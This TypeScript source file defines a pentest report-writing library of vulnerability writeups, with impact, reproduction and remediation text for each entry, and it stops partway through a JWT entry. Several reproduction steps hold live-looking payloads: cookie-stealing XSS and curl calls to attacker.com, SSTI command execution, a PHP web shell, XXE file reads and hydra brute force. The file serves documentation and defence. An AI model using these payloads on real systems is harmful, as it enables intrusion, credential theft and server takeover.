// src/lib/writeupDatabase.ts
// 200+ pre-loaded vulnerability writeups across all major pentest categories
// Modeled after AttackForge's writeup library system

export interface Writeup {
  id: string;
  title: string;
  category: WriteupCategory;
  severity: "Critical" | "High" | "Medium" | "Low" | "Info";
  cvss_score: number | null;
  cwe_id: string;
  owasp: string;
  description: string;
  impact: string;
  steps_to_reproduce: string;
  remediation: string;
  references: string[];
  tags: string[];
}

export type WriteupCategory =
  | "Injection"
  | "Broken Authentication"
  | "Sensitive Data Exposure"
  | "XML & Deserialization"
  | "Access Control"
  | "Security Misconfiguration"
  | "XSS"
  | "Insecure Deserialization"
  | "Vulnerable Components"
  | "Logging & Monitoring"
  | "Cryptography"
  | "API Security"
  | "Infrastructure"
  | "Network"
  | "Cloud"
  | "Mobile"
  | "Business Logic"
  | "Information Disclosure"
  | "SSRF"
  | "File Upload"
  | "XXE"
  | "CORS"
  | "JWT"
  | "CSRF"
  | "Clickjacking"
  | "Open Redirect"
  | "DNS"
  | "TLS / SSL"
  | "HTTP Headers"
  | "LDAP"
  | "Command Injection"
  | "Path Traversal"
  | "Race Condition"
  | "GraphQL"
  | "WebSocket"
  | "OAuth"
  | "Password Policy"
  | "Social Engineering";

export const WRITEUP_CATEGORIES: WriteupCategory[] = [
  "Injection","Broken Authentication","Sensitive Data Exposure","XML & Deserialization",
  "Access Control","Security Misconfiguration","XSS","Insecure Deserialization",
  "Vulnerable Components","Logging & Monitoring","Cryptography","API Security",
  "Infrastructure","Network","Cloud","Mobile","Business Logic","Information Disclosure",
  "SSRF","File Upload","XXE","CORS","JWT","CSRF","Clickjacking","Open Redirect","DNS",
  "TLS / SSL","HTTP Headers","LDAP","Command Injection","Path Traversal","Race Condition",
  "GraphQL","WebSocket","OAuth","Password Policy","Social Engineering",
];

export const WRITEUPS_DB: Writeup[] = [
  // ── INJECTION ────────────────────────────────────────────────────────────────
  {
    id:"wup-001",title:"SQL Injection",category:"Injection",severity:"Critical",cvss_score:9.8,
    cwe_id:"CWE-89",owasp:"A03:2021",
    description:"The application constructs SQL queries using untrusted user input without proper sanitisation or parameterisation, allowing an attacker to manipulate the query logic.",
    impact:"Complete database compromise including data exfiltration, modification, deletion. Potential for remote code execution via SQL features (xp_cmdshell, INTO OUTFILE). Authentication bypass.",
    steps_to_reproduce:"1. Identify input fields that interact with a database.\n2. Insert a single quote (') and observe error messages or behavioural changes.\n3. Use payloads such as: ' OR '1'='1 or ' UNION SELECT NULL--\n4. Enumerate tables and extract sensitive data.",
    remediation:"Use parameterised queries / prepared statements exclusively. Never concatenate user input into SQL strings. Implement a Web Application Firewall. Apply principle of least privilege to database accounts. Disable detailed database error messages in production.",
    references:["https://owasp.org/www-community/attacks/SQL_Injection","https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html","https://cwe.mitre.org/data/definitions/89.html"],
    tags:["OWASP Top 10","CWE Top 25","PCI DSS","database"],
  },
  {
    id:"wup-002",title:"Blind SQL Injection",category:"Injection",severity:"High",cvss_score:8.8,
    cwe_id:"CWE-89",owasp:"A03:2021",
    description:"The application is vulnerable to SQL injection but does not return query results or error messages. Exploitation relies on boolean-based or time-based inference.",
    impact:"Full database exfiltration is possible via automated tools (sqlmap). Attack is slower but equally effective for reading all database contents.",
    steps_to_reproduce:"1. Inject: ' AND 1=1-- (should return normal results) vs ' AND 1=2-- (should return no results or error).\n2. Time-based: ' AND SLEEP(5)-- to confirm vulnerability.\n3. Use sqlmap --level=3 --risk=2 for automated exploitation.",
    remediation:"Same as SQL Injection: use prepared statements and parameterised queries. Ensure all input is validated server-side.",
    references:["https://owasp.org/www-community/attacks/Blind_SQL_Injection","https://portswigger.net/web-security/sql-injection/blind"],
    tags:["OWASP Top 10","CWE Top 25","blind"],
  },
  {
    id:"wup-003",title:"NoSQL Injection",category:"Injection",severity:"High",cvss_score:8.1,
    cwe_id:"CWE-943",owasp:"A03:2021",
    description:"The application uses a NoSQL database (MongoDB, CouchDB, etc.) and fails to sanitise operator characters in user input, allowing injection of NoSQL operators.",
    impact:"Authentication bypass, unauthorised data access, data manipulation. E.g. injecting {\"$gt\":\"\"} to bypass password checks.",
    steps_to_reproduce:'1. Test login with: {"username": {"$gt": ""}, "password": {"$gt": ""}}\n2. Or URL-encoded: username[$gt]=&password[$gt]=\n3. Observe authentication bypass.',
    remediation:"Validate and sanitise all user input. Use type casting to ensure inputs are the expected type. Use MongoDB schema validation. Apply allowlisting for query operators.",
    references:["https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection","https://cwe.mitre.org/data/definitions/943.html"],
    tags:["NoSQL","MongoDB","injection"],
  },
  {
    id:"wup-004",title:"LDAP Injection",category:"LDAP",severity:"High",cvss_score:7.5,
    cwe_id:"CWE-90",owasp:"A03:2021",
    description:"User-controlled input is incorporated into LDAP queries without sanitisation, allowing manipulation of LDAP filters to bypass authentication or access unauthorised directory information.",
    impact:"Authentication bypass, unauthorised read access to directory information (usernames, emails, group memberships, passwords in some cases).",
    steps_to_reproduce:"1. Inject: *)(uid=*))(|(uid=* into username field.\n2. Or: admin)(&) to bypass authentication.\n3. Observe behaviour change.",
    remediation:"Use safe LDAP APIs that support parameterisation. Escape special characters: ( ) * \\ NULL. Validate input against allowlist. Use least-privilege LDAP accounts.",
    references:["https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html","https://cwe.mitre.org/data/definitions/90.html"],
    tags:["LDAP","injection","authentication"],
  },
  {
    id:"wup-005",title:"OS Command Injection",category:"Command Injection",severity:"Critical",cvss_score:9.8,
    cwe_id:"CWE-78",owasp:"A03:2021",
    description:"The application passes user-controlled data to system shell commands without adequate sanitisation, allowing arbitrary OS command execution.",
    impact:"Full system compromise. Attacker can execute arbitrary commands, read sensitive files, create backdoors, pivot to internal network, achieve full RCE.",
    steps_to_reproduce:"1. Identify fields used in server-side commands (e.g. filename, IP address, domain name inputs).\n2. Test with: ; id, | whoami, && cat /etc/passwd, `id`\n3. Use out-of-band detection: ; curl attacker.com/$(whoami)",
    remediation:"Never pass user input to OS commands. If unavoidable, use allowlisting and strict input validation. Use language-specific APIs instead of shell commands. Run applications with minimal OS privileges. Use sandboxing/containers.",
    references:["https://owasp.org/www-community/attacks/Command_Injection","https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html","https://cwe.mitre.org/data/definitions/78.html"],
    tags:["OWASP Top 10","CWE Top 25","RCE","critical"],
  },
  {
    id:"wup-006",title:"Server-Side Template Injection (SSTI)",category:"Injection",severity:"Critical",cvss_score:9.0,
    cwe_id:"CWE-94",owasp:"A03:2021",
    description:"User input is embedded in server-side templates (Jinja2, Twig, Freemarker, etc.) and evaluated by the template engine, leading to remote code execution.",
    impact:"Remote code execution with the privileges of the web server process. Full server compromise.",
    steps_to_reproduce:"1. Inject arithmetic expressions: {{7*7}}, ${7*7}, #{7*7}, <%= 7*7 %>\n2. If '49' is rendered, SSTI is confirmed.\n3. Escalate with engine-specific RCE payloads:\n   Jinja2: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}\n   Freemarker: <#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
    remediation:"Never allow user input to be used as template strings. Use template engines' sandboxing features. Implement strict input validation. Use logic-less templates (Mustache) where possible.",
    references:["https://portswigger.net/web-security/server-side-template-injection","https://cwe.mitre.org/data/definitions/94.html"],
    tags:["SSTI","RCE","template","injection"],
  },
  // ── XSS ──────────────────────────────────────────────────────────────────────
  {
    id:"wup-010",title:"Reflected Cross-Site Scripting (XSS)",category:"XSS",severity:"High",cvss_score:6.1,
    cwe_id:"CWE-79",owasp:"A03:2021",
    description:"User-supplied input is returned in HTTP responses without adequate encoding, allowing injection of malicious scripts that execute in the victim's browser.",
    impact:"Session hijacking, credential theft, malware distribution, defacement, phishing via crafted URLs. Requires victim to click a malicious link.",
    steps_to_reproduce:'1. Identify parameters reflected in response.\n2. Test: <script>alert(1)</script>, "><img src=x onerror=alert(1)>\n3. Craft payload to steal cookies: <script>fetch("https://attacker.com/?c="+document.cookie)</script>',
    remediation:"Encode all output: HTML encode for HTML context, JS encode for JavaScript context, URL encode for URLs. Use Content Security Policy (CSP). Set HttpOnly flag on session cookies. Use modern frameworks that auto-escape output.",
    references:["https://owasp.org/www-community/attacks/xss/","https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html","https://cwe.mitre.org/data/definitions/79.html"],
    tags:["OWASP Top 10","CWE Top 25","XSS","reflected"],
  },
  {
    id:"wup-011",title:"Stored Cross-Site Scripting (XSS)",category:"XSS",severity:"High",cvss_score:8.0,
    cwe_id:"CWE-79",owasp:"A03:2021",
    description:"Malicious scripts are permanently stored on the server and served to all users who view the affected content, without requiring victim interaction beyond visiting the page.",
    impact:"Mass session hijacking, credential theft for all users viewing the page, persistent backdoor, worm propagation.",
    steps_to_reproduce:'1. Find input fields that are stored and rendered to other users (comments, profile fields, message boards).\n2. Store payload: <script>new Image().src="https://attacker.com/steal?c="+document.cookie</script>\n3. View the page with a different account and confirm execution.',
    remediation:"Same as Reflected XSS plus: validate and sanitise ALL stored input at both input and output stages. Implement CSP. Use HTML sanitisation libraries (DOMPurify) for rich text. Never store raw HTML from users.",
    references:["https://owasp.org/www-community/attacks/xss/#stored-xss-attacks","https://portswigger.net/web-security/cross-site-scripting/stored"],
    tags:["OWASP Top 10","CWE Top 25","XSS","stored","persistent"],
  },
  {
    id:"wup-012",title:"DOM-Based Cross-Site Scripting (XSS)",category:"XSS",severity:"Medium",cvss_score:6.1,
    cwe_id:"CWE-79",owasp:"A03:2021",
    description:"The client-side script writes user-controlled data to the DOM using dangerous sinks (innerHTML, document.write, eval) without sanitisation.",
    impact:"Same as Reflected XSS but harder to detect with server-side WAFs as the payload never reaches the server.",
    steps_to_reproduce:"1. Identify DOM sinks: innerHTML, outerHTML, document.write(), eval(), location.href\n2. Identify sources: location.hash, location.search, document.referrer, postMessage\n3. Test: https://target.com/page#<img src=x onerror=alert(1)>",
    remediation:"Use safe DOM APIs: textContent instead of innerHTML. Use DOMPurify for sanitisation. Avoid eval(), setTimeout/setInterval with strings, document.write(). Implement CSP with nonce-based script execution.",
    references:["https://portswigger.net/web-security/cross-site-scripting/dom-based","https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html"],
    tags:["OWASP Top 10","XSS","DOM","client-side"],
  },
  // ── BROKEN AUTHENTICATION ────────────────────────────────────────────────────
  {
    id:"wup-020",title:"Broken Authentication – Weak Password Policy",category:"Broken Authentication",severity:"Medium",cvss_score:5.3,
    cwe_id:"CWE-521",owasp:"A07:2021",
    description:"The application enforces an insufficient password policy, allowing users to set weak or easily guessable passwords.",
    impact:"Account compromise via brute-force, dictionary attacks, or credential stuffing from breached datasets.",
    steps_to_reproduce:"1. Register/change password with: password123, 12345678, admin, [username]\n2. Observe whether weak passwords are accepted.\n3. Document minimum length, complexity requirements.",
    remediation:"Enforce minimum 12 characters. Require mix of uppercase, lowercase, numbers, special characters. Check against known breached password lists (HaveIBeenPwned API). Implement account lockout after failed attempts. Recommend passphrase-based passwords.",
    references:["https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html","https://pages.nist.gov/800-63-3/sp800-63b.html","https://cwe.mitre.org/data/definitions/521.html"],
    tags:["authentication","password","NIST","brute-force"],
  },
  {
    id:"wup-021",title:"Brute Force – No Account Lockout",category:"Broken Authentication",severity:"High",cvss_score:7.5,
    cwe_id:"CWE-307",owasp:"A07:2021",
    description:"The application does not limit the number of failed authentication attempts, allowing unlimited brute-force attacks against user accounts.",
    impact:"Attackers can use automated tools to systematically try all possible passwords until the correct one is found, leading to account compromise.",
    steps_to_reproduce:"1. Attempt to log in with an invalid password 10-20 times.\n2. Observe no lockout, CAPTCHA, or rate limiting is applied.\n3. Demonstrate with: hydra -l admin -P rockyou.txt target.com http-post-form",
    remediation:"Implement account lockout after 5-10 failed attempts with increasing delays. Add CAPTCHA after failed attempts. Implement rate limiting per IP. Alert users of unusual login activity. Consider multi-factor authentication.",
    references:["https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html#account-lockout","https://cwe.mitre.org/data/definitions/307.html"],
    tags:["brute-force","authentication","lockout","rate-limiting"],
  },
  {
    id:"wup-022",title:"Default Credentials",category:"Broken Authentication",severity:"Critical",cvss_score:9.8,
    cwe_id:"CWE-1392",owasp:"A07:2021",
    description:"The application, device, or service is accessible using factory default credentials that have not been changed during deployment.",
    impact:"Immediate full administrative access. Complete system compromise without any technical exploitation.",
    steps_to_reproduce:"1. Identify application/device type and version.\n2. Check default credentials lists: admin/admin, admin/password, admin/<blank>, root/root\n3. Consult: https://www.cirt.net/passwords\n4. Attempt login with discovered defaults.",
    remediation:"Force credential change on first login. Remove or disable default accounts. Use unique per-device credentials during manufacturing. Regularly audit for default credential use. Implement credential management policies.",
    references:["https://cwe.mitre.org/data/definitions/1392.html","https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/04-Authentication_Testing/02-Testing_for_Default_Credentials"],
    tags:["default credentials","authentication","critical"],
  },
  {
    id:"wup-023",title:"Session Fixation",category:"Broken Authentication",severity:"High",cvss_score:8.1,
    cwe_id:"CWE-384",owasp:"A07:2021",
    description:"The application does not generate a new session token upon successful authentication, allowing an attacker to pre-set a session ID and hijack the victim's session after they authenticate.",
    impact:"Full session hijacking. Attacker gains access to the victim's authenticated session without knowing their credentials.",
    steps_to_reproduce:"1. Note the session token before authentication.\n2. Authenticate with valid credentials.\n3. Compare session token after login — if unchanged, fixation is possible.\n4. Attacker sets: Set-Cookie: JSESSIONID=ATTACKER_VALUE then sends link to victim.",
    remediation:"Always generate a new session ID upon successful authentication. Invalidate any existing session before creating a new one. Use secure, HttpOnly, SameSite cookie flags.",
    references:["https://owasp.org/www-community/attacks/Session_fixation","https://cwe.mitre.org/data/definitions/384.html"],
    tags:["session","authentication","fixation"],
  },
  // ── ACCESS CONTROL ───────────────────────────────────────────────────────────
  {
    id:"wup-030",title:"Insecure Direct Object Reference (IDOR)",category:"Access Control",severity:"High",cvss_score:8.8,
    cwe_id:"CWE-639",owasp:"A01:2021",
    description:"The application exposes internal object references (IDs, filenames, keys) without validating that the requesting user has authorisation to access the referenced object.",
    impact:"Unauthorised access to other users' data, account takeover, sensitive data exposure, privilege escalation.",
    steps_to_reproduce:"1. Identify parameters referencing objects: /api/users/123, /download?file=invoice_001.pdf\n2. Modify values incrementally: /api/users/124\n3. Observe whether another user's data is returned.",
    remediation:"Implement server-side authorisation checks on every request. Use indirect references (UUIDs, hashed IDs) instead of sequential integers. Apply access control at the data layer, not just the UI.",
    references:["https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References","https://cwe.mitre.org/data/definitions/639.html"],
    tags:["IDOR","access control","authorisation","OWASP Top 10"],
  },
  {
    id:"wup-031",title:"Privilege Escalation – Horizontal",category:"Access Control",severity:"High",cvss_score:8.1,
    cwe_id:"CWE-269",owasp:"A01:2021",
    description:"A user with a valid account can access resources or perform actions belonging to another user of the same privilege level.",
    impact:"Unauthorised access to peer users' data, actions performed on behalf of another user.",
    steps_to_reproduce:"1. Log in as User A, note account/resource identifiers.\n2. Log in as User B.\n3. Attempt to access User A's resources using User B's session.\n4. Or modify request parameters to reference User A's objects.",
    remediation:"Enforce ownership checks on every access. Verify session user matches the resource owner. Centralise access control logic. Log and alert on unauthorised access attempts.",
    references:["https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control","https://cwe.mitre.org/data/definitions/269.html"],
    tags:["privilege escalation","horizontal","access control"],
  },
  {
    id:"wup-032",title:"Privilege Escalation – Vertical",category:"Access Control",severity:"Critical",cvss_score:9.1,
    cwe_id:"CWE-269",owasp:"A01:2021",
    description:"A lower-privileged user can access functionality or data reserved for higher-privileged users (e.g., regular user accessing admin functions).",
    impact:"Full administrative access, ability to manage all users, access all data, modify system configuration.",
    steps_to_reproduce:"1. As a regular user, identify admin endpoints from JS files, API docs, or traffic analysis.\n2. Attempt direct access: GET /admin/users, POST /api/admin/reset\n3. Or modify role parameter in request: role=admin",
    remediation:"Implement role-based access control (RBAC). Enforce role checks server-side on every privileged endpoint. Never rely on client-side role enforcement. Audit all admin functionality for missing authorisation.",
    references:["https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control","https://portswigger.net/web-security/access-control/privilege-escalation"],
    tags:["privilege escalation","vertical","admin","RBAC","critical"],
  },
  {
    id:"wup-033",title:"Missing Function Level Access Control",category:"Access Control",severity:"High",cvss_score:7.5,
    cwe_id:"CWE-285",owasp:"A01:2021",
    description:"The application presents a UI restricted to authorised users but fails to enforce the same restrictions on the underlying server-side functions or APIs.",
    impact:"Unauthorised users can call sensitive functions directly via API requests, bypassing UI-level restrictions.",
    steps_to_reproduce:"1. Identify restricted UI elements (hidden via CSS/JS).\n2. Locate corresponding API calls in browser DevTools.\n3. Replay API calls with a lower-privileged session token.\n4. Or call endpoints identified via path fuzzing.",
    remediation:"Enforce access controls on every server-side function and API endpoint independently. Do not rely on client-side hiding. Implement centralised access control middleware.",
    references:["https://owasp.org/www-project-top-ten/2017/A7_2017-Missing_Function_Level_Access_Control","https://cwe.mitre.org/data/definitions/285.html"],
    tags:["access control","API","function-level","OWASP Top 10"],
  },
  // ── SSRF ─────────────────────────────────────────────────────────────────────
  {
    id:"wup-040",title:"Server-Side Request Forgery (SSRF)",category:"SSRF",severity:"Critical",cvss_score:9.8,
    cwe_id:"CWE-918",owasp:"A10:2021",
    description:"The application fetches remote resources based on user-supplied URLs without adequate validation, allowing an attacker to cause the server to make requests to unintended targets.",
    impact:"Access to internal services not exposed externally, cloud metadata (AWS/GCP/Azure credentials), RCE via internal services, port scanning of internal network, full cloud account takeover.",
    steps_to_reproduce:"1. Identify parameters accepting URLs: url=, webhook=, fetch=, image=\n2. Replace with: http://169.254.169.254/latest/meta-data/ (AWS metadata)\n3. Or: http://localhost:8080/admin, http://10.0.0.1/\n4. Check response for internal data.",
    remediation:"Implement allowlist of permitted domains/IPs. Block requests to private IP ranges and cloud metadata endpoints. Disable URL redirects. Use DNS resolution and IP validation before making requests. Deploy SSRF-aware WAF rules.",
    references:["https://owasp.org/www-community/attacks/Server_Side_Request_Forgery","https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html","https://cwe.mitre.org/data/definitions/918.html"],
    tags:["SSRF","OWASP Top 10","cloud","metadata","critical"],
  },
  {
    id:"wup-041",title:"SSRF – Blind",category:"SSRF",severity:"High",cvss_score:7.5,
    cwe_id:"CWE-918",owasp:"A10:2021",
    description:"The application makes server-side requests based on user input but does not return the response, making exploitation detection reliant on out-of-band techniques.",
    impact:"Internal network port scanning, probing internal services, potentially triggering actions on internal systems.",
    steps_to_reproduce:"1. Set up an OOB listener (Burp Collaborator, interactsh).\n2. Inject your OOB URL into the parameter.\n3. Confirm DNS/HTTP interactions received.",
    remediation:"Same as SSRF: implement URL allowlisting, block internal IP ranges, disable redirects.",
    references:["https://portswigger.net/web-security/ssrf/blind","https://cwe.mitre.org/data/definitions/918.html"],
    tags:["SSRF","blind","OOB","out-of-band"],
  },
  // ── XXE ──────────────────────────────────────────────────────────────────────
  {
    id:"wup-050",title:"XML External Entity Injection (XXE)",category:"XXE",severity:"Critical",cvss_score:9.1,
    cwe_id:"CWE-611",owasp:"A05:2021",
    description:"The XML parser processes external entity definitions from user-supplied XML, allowing attackers to read arbitrary files, perform SSRF, or execute denial-of-service attacks.",
    impact:"Local file disclosure (/etc/passwd, application config files with credentials), SSRF, denial of service via Billion Laughs attack.",
    steps_to_reproduce:'1. Intercept a request containing XML.\n2. Add entity definition:\n   <?xml version="1.0"?>\n   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n   <root>&xxe;</root>\n3. Observe file contents in response.',
    remediation:"Disable external entity processing in all XML parsers. Use safe XML parsing libraries. Disable DTD processing. Migrate from XML to JSON where possible. Validate and sanitise all XML input.",
    references:["https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing","https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html","https://cwe.mitre.org/data/definitions/611.html"],
    tags:["XXE","XML","file-read","SSRF","OWASP Top 10"],
  },
  // ── FILE UPLOAD ──────────────────────────────────────────────────────────────
  {
    id:"wup-060",title:"Unrestricted File Upload – Remote Code Execution",category:"File Upload",severity:"Critical",cvss_score:9.8,
    cwe_id:"CWE-434",owasp:"A04:2021",
    description:"The application allows upload of arbitrary file types without adequate validation, enabling an attacker to upload server-side executable files (web shells).",
    impact:"Full remote code execution on the web server. Attacker can read/write all files, execute OS commands, establish persistent backdoors.",
    steps_to_reproduce:"1. Upload a PHP web shell: <?php system($_GET['cmd']); ?> as shell.php\n2. Or bypass extension filters: shell.php.jpg, shell.pHp, shell.php5\n3. Identify the upload path and access the file.\n4. Execute: /uploads/shell.php?cmd=id",
    remediation:"Validate file type by magic bytes, not extension or Content-Type. Use allowlist for permitted file types. Rename uploaded files to random names. Store uploads outside web root or in a separate domain. Disable script execution in upload directories.",
    references:["https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload","https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html","https://cwe.mitre.org/data/definitions/434.html"],
    tags:["file upload","RCE","web shell","critical","CWE Top 25"],
  },
  {
    id:"wup-061",title:"Path Traversal in File Upload",category:"File Upload",severity:"High",cvss_score:7.5,
    cwe_id:"CWE-22",owasp:"A01:2021",
    description:"The application uses the user-supplied filename for storage without normalisation, allowing an attacker to write files to arbitrary locations via path traversal sequences.",
    impact:"Overwrite of application files, server configuration, or cron jobs. Potentially leads to RCE if writable system files can be overwritten.",
    steps_to_reproduce:"1. Upload a file with filename: ../../../etc/cron.d/backdoor\n2. Or: ../../index.php\n3. Check if file is written to unexpected location.",
    remediation:"Strip path separators from filenames. Generate random filenames server-side. Validate and normalise all file paths before use. Store files in isolated, non-web-accessible directories.",
    references:["https://owasp.org/www-community/attacks/Path_Traversal","https://cwe.mitre.org/data/definitions/22.html"],
    tags:["path traversal","file upload","directory traversal"],
  },
  // ── PATH TRAVERSAL ───────────────────────────────────────────────────────────
  {
    id:"wup-065",title:"Path Traversal / Directory Traversal",category:"Path Traversal",severity:"High",cvss_score:7.5,
    cwe_id:"CWE-22",owasp:"A01:2021",
    description:"The application uses user-controlled input to construct file paths without proper sanitisation, allowing traversal outside the intended directory to read arbitrary files.",
    impact:"Disclosure of sensitive files: /etc/passwd, application configuration, private keys, database credentials, source code.",
    steps_to_reproduce:"1. Identify file-serving parameters: ?file=, ?doc=, ?path=\n2. Inject: ../../../etc/passwd\n3. URL-encoded variants: ..%2F..%2F..%2Fetc%2Fpasswd\n4. Double-encoded: ..%252F..%252Fetc%252Fpasswd",
    remediation:"Canonicalise all file paths and validate they remain within the expected base directory. Use allowlisting for permitted file names. Avoid passing user input to file system APIs. Run application with minimal file system permissions.",
    references:["https://owasp.org/www-community/attacks/Path_Traversal","https://portswigger.net/web-security/file-path-traversal","https://cwe.mitre.org/data/definitions/22.html"],
    tags:["path traversal","directory traversal","file read","CWE Top 25"],
  },
  // ── CRYPTOGRAPHY ─────────────────────────────────────────────────────────────
  {
    id:"wup-070",title:"Weak Cryptographic Algorithm",category:"Cryptography",severity:"High",cvss_score:7.4,
    cwe_id:"CWE-327",owasp:"A02:2021",
    description:"The application uses cryptographically weak or deprecated algorithms (MD5, SHA-1, DES, RC4, 3DES) for sensitive operations such as password hashing, data encryption, or token generation.",
    impact:"Cryptographic material can be broken: passwords cracked from hashes, encrypted data decrypted, tokens predicted/forged.",
    steps_to_reproduce:"1. Analyse response headers, cookies, and token structure.\n2. Identify hashing algorithms from source code, error messages, or hash patterns.\n3. MD5 hashes are 32 hex chars, SHA-1 are 40. Crack with: hashcat -m 0 hash.txt rockyou.txt",
    remediation:"Use bcrypt, Argon2, or scrypt for password hashing. Use AES-256-GCM for symmetric encryption. Use SHA-256 or SHA-512 for hashing. Use RSA-2048+ or ECDSA P-256 for asymmetric operations. Follow NIST guidelines.",
    references:["https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html","https://cwe.mitre.org/data/definitions/327.html","https://www.nist.gov/cryptography"],
    tags:["cryptography","weak algorithm","hashing","encryption"],
  },
  {
    id:"wup-071",title:"Hardcoded Cryptographic Key",category:"Cryptography",severity:"Critical",cvss_score:9.1,
    cwe_id:"CWE-321",owasp:"A02:2021",
    description:"Cryptographic keys are hardcoded in application source code, configuration files, or client-side code, making them accessible to anyone with access to the code.",
    impact:"Complete compromise of the encryption scheme. Attacker can decrypt all encrypted data, forge tokens, or impersonate the application.",
    steps_to_reproduce:"1. Search source code for key patterns: SECRET_KEY, ENCRYPTION_KEY, AES_KEY, JWT_SECRET\n2. Check .env files, config files, mobile app binaries (strings command)\n3. Search GitHub/GitLab for accidentally committed secrets.",
    remediation:"Store all cryptographic keys in secure key management systems (AWS KMS, HashiCorp Vault, Azure Key Vault). Load keys from environment variables at runtime. Rotate all exposed keys immediately. Implement secret scanning in CI/CD.",
    references:["https://cwe.mitre.org/data/definitions/321.html","https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html"],
    tags:["hardcoded","cryptography","key","secret","critical"],
  },
  // ── SENSITIVE DATA EXPOSURE ───────────────────────────────────────────────────
  {
    id:"wup-080",title:"Sensitive Data in URL Parameters",category:"Sensitive Data Exposure",severity:"Medium",cvss_score:5.3,
    cwe_id:"CWE-598",owasp:"A02:2021",
    description:"Sensitive data such as session tokens, API keys, passwords, or PII is transmitted in URL query parameters, exposing it to browser history, server logs, and referrer headers.",
    impact:"Credential exposure via server logs, browser history, proxy logs, and Referer headers when navigating to external sites.",
    steps_to_reproduce:"1. Observe authentication tokens or sensitive data in URL: ?token=eyJ..., ?password=...\n2. Navigate to an external page and check Referer header.\n3. Check access logs for sensitive values.",
    remediation:"Transmit sensitive data in POST request body or HTTP headers. Use POST instead of GET for authentication flows. Implement proper session management with HTTP cookies (HttpOnly, Secure, SameSite).",
    references:["https://cwe.mitre.org/data/definitions/598.html","https://owasp.org/www-project-web-security-testing-guide/"],
    tags:["sensitive data","URL","GET parameter","session"],
  },
  {
    id:"wup-081",title:"Verbose Error Messages – Information Disclosure",category:"Information Disclosure",severity:"Medium",cvss_score:5.3,
    cwe_id:"CWE-209",owasp:"A05:2021",
    description:"The application returns detailed error messages including stack traces, database query details, internal paths, or software versions that can aid an attacker in planning further attacks.",
    impact:"Disclosure of technology stack, internal file paths, database schema, software versions, and internal IP addresses.",
    steps_to_reproduce:"1. Trigger errors by sending malformed input, invalid parameters, or accessing non-existent resources.\n2. Observe stack traces, SQL errors, or internal path information in responses.\n3. Document disclosed technology information.",
    remediation:"Configure custom error pages for all error codes. Disable debugging in production. Log detailed errors server-side only. Never return stack traces or SQL errors to clients.",
    references:["https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/","https://cwe.mitre.org/data/definitions/209.html"],
    tags:["information disclosure","error messages","stack trace"],
  },
  {
    id:"wup-082",title:"Sensitive Data Stored in Browser LocalStorage",category:"Sensitive Data Exposure",severity:"Medium",cvss_score:6.5,
    cwe_id:"CWE-312",owasp:"A02:2021",
    description:"The application stores sensitive information (tokens, credentials, PII) in browser localStorage or sessionStorage, which is accessible to any JavaScript on the page.",
    impact:"XSS attacks can read and exfiltrate all data from localStorage, leading to session hijacking or credential theft.",
    steps_to_reproduce:"1. Open browser DevTools → Application → Local Storage.\n2. Observe sensitive data: auth tokens, user data, API keys.\n3. Demonstrate access via XSS payload: localStorage.getItem('authToken')",
    remediation:"Store sensitive tokens in HttpOnly cookies (inaccessible to JavaScript). Avoid storing sensitive data in localStorage. If unavoidable, encrypt data before storage and implement robust XSS prevention.",
    references:["https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#local-storage","https://cwe.mitre.org/data/definitions/312.html"],
    tags:["localStorage","sensitive data","XSS","browser storage"],
  },
  // ── JWT ───────────────────────────────────────────────────────────────────────
  {
    id:"wup-090",title:"JWT – Algorithm None Attack",category:"JWT",severity:"Critical",cvss_score:9.8,
    cwe_id:"CWE-347",owasp:"A07:2021",
    description:"The JWT implementation accepts tokens with the algorithm set to 'none', bypassing signature verification entirely and allowing token forgery.",
    impact:"Complete authentication bypass. Attacker can forge tokens with any claims (admin role, different user ID) without needing the signing key.",
    steps_to_reproduce:"1. Decode the JWT (base64 decode header and payload).\n2. Modify header to: {\"alg\":\"none\",\"typ\":\"JWT\"}\n3. Modify payload claims as desired (e.g. role:admin)\n4. Remove the signature: header.payload.\n5. Send modified token.",
    remediation:"Explicitly allowlist accepted algorithms. Never accept 'none' algorithm. Use a library that rejects 'none' by default. Validate algorithm header against server configuration before verifying signature.",
    references:["https://portswigger.net/web-security/jwt","https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/","https://cwe.mitre.org/data/definitions/347.html"],
    tags:["JWT","authentication","algorithm none","token forgery","critical"],
  },
  {
    id:"wup-091",title:"JWT – Weak Secret Key",category:"JWT",severity:"Critical",cvss_score:8.8,
    cwe_id:"CWE-326",owasp:"A07:2021",
    description:"The JWT signing key is too short, uses a common/default value, or is otherwise weak, allowing offline brute-force attacks to recover the key and forge arbitrary tokens.",
